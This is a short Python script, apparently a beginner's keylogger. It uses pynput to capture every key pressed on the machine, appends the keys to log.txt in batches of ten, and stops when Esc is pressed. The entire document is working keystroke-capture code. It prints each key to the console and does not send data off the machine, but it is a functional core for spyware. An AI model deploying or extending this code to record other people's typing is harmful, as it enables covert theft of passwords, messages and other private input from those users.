#!/bin/python

import pynput
from pynput.keyboard import Key, Listener

count = 0 #If the user is somehow able to break out of the program, after the user hits a certain amount of keys, the user will be able to add the data into the files
count_space = 0
keys = []

#Listener is what listens to the key events

def on_press(key):
    
    global keys, count

    keys.append(key)
    
    count += 1
    
    print("{0} pressed".format(key))
    
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(key):

    global count_space
    with open("log.txt", "a") as f:
        for key in keys:
           
            k = str(key).replace("'", "")
            
            if k.find("space") > 0: #key.space is returned when space is pressed, that is why we use space                    
                count_space += 1
                
                if (count_space > 1):
                    continue
                else:
                    f.write('\n')
            
            elif k.find("Key") == -1:
                f.write(k)
                count_space = 0

def on_release(key):

    with open("log.txt", "a") as f:
        if key == Key.esc:
            f.write("\n")
            return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join() #This loop is constantly run till we exit from it
